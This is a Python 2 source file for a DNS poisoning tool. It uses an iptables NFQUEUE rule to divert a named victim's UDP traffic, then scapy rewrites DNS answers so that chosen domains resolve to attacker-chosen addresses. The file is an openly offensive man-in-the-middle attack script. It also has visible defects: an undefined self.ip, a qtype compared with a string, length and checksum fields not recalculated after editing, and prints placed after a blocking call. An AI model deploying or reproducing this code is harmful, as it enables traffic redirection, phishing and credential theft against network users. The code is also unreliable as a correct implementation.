from scapy.all import *
from netfilterqueue import NetfilterQueue     #Library capable of handling IP packets
import multiprocessing
import os

class DnsPoisoner(multiprocessing.Process):

    def __init__(self, ip_victim, queue_num):

        multiprocessing.Process.__init__(self)

        self.urls_to_spoof = {}
        self.queue         = NetfilterQueue()    #Initialize netfilterqueue object  
        #Create rules on how to handles packets destined for your LAN
        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #Restores original ip rule
        self.exit          = multiprocessing.Event()

        #Initialize queue identified by queue_num and specify that the packets are passed as arguments of handle_packet()
        self.queue.bind(queue_num, self.handle_packet) 

    def add_url(self, url, ip):
        self.urls_to_spoof[url] = ip # TODO regex toevoegen

    def handle_packet(self, packet_nfqueue):
        """Handles each packet in the queue by editing them if neccessary."""
        packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
        
        if packet_scapy.haslayer(DNSRR):
            packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
            packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet

        packet_nfqueue.accept()    #accept the packet and release it back into the wild

    def edit_dnsrr(self, packet):
        """Edits DNS request answer in order to poison"""
        if packet[DNSQR].qname in self.urls_to_spoof.keys():
            
            if packet[DNSQR].qtype == "A":
                packet[DNSRR].rdata = self.urls_to_spoof[packet[DNSQR].qname]
            
            if packet[DNSQR].qtype == "AAAA":
                pass # TODO wat te doen met ipv6?

        return packet

    def run(self):

        self.exit.clear()
        os.system(self.iprule_add)    #make sure DNS packets are intercepted
        self.queue.run()    #queue starts accepting packages

        print "DNS poisoning attack against {} started".format(self.ip)

        while not self.exit.is_set():
            time.sleep(1)

        os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
        self.queue.unbind()    #delete queue

        print "DNS poisoning attack against {} stopped".format(self.ip)

    def stop(self):

        self.exit.set()
